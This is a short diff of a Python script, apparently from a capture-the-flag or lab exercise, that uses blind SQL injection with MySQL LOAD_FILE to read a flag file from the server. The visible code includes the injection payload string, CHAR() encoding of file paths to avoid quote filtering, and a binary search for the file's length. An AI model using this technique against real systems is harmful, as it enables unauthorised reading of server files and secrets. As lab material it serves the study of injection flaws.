@@ -9,7 +9,7 @@ my_cookies = {
 }
 
 def path_to_char(path):
-    """Convert file path string to SQL CHAR() notation to avoid single-quote conflicts."""
+    # Convert file path string to SQL CHAR() notation to avoid single-quote conflicts.
     return "CHAR(" + ",".join(str(ord(c)) for c in path) + ")"
 
 def check_connection():
@@ -22,7 +22,7 @@ def check_connection():
         return False
 
 def get_file_length(path_char):
-    """Binary search for exact file length using LENGTH(LOAD_FILE(...))."""
+    # Binary search for exact file length using LENGTH(LOAD_FILE(...)).
     lo, hi = 0, 500
     # First confirm file exists and has some content
     payload = f"alice' AND LENGTH(LOAD_FILE({path_char}))>0 #"
@@ -74,24 +74,16 @@ def extract_flag(file_path="/home/flag.txt"):
 if __name__ == "__main__":
     print("Part 8: Reading /home/flag.txt via Blind SQLi + LOADFILE (UNION SELECT style)\n")
 
-    paths_to_try = [
-        "/home/flag.txt",
-        "/root/flag.txt",
-        "/var/www/html/flag.txt",
-        "/flag.txt",
-        "/home/user/flag.txt",
-    ]
+    path = "/home/flag.txt"
 
     if check_connection():
-        for path in paths_to_try:
-            print(f"Trying {path} ...")
-            flag = extract_flag(file_path=path)
-            if flag:
-                print(f"Hex:     {flag.hex()}")
-                try:
-                    print(f"As text: {flag.decode('utf-8')}")
-                except Exception:
-                    print(f"As latin-1: {flag.decode('latin-1')}")
-                break
-            else:
-                print("  (empty — file missing or no FILE privilege)\n")
+        print(f"Trying {path} ...")
+        flag = extract_flag(file_path=path)
+        if flag:
+            print(f"Hex:     {flag.hex()}")
+            try:
+                print(f"As text: {flag.decode('utf-8')}")
+            except Exception:
+                print(f"As latin-1: {flag.decode('latin-1')}")
+        else:
+            print("  (empty — file missing or no FILE privilege)\n")
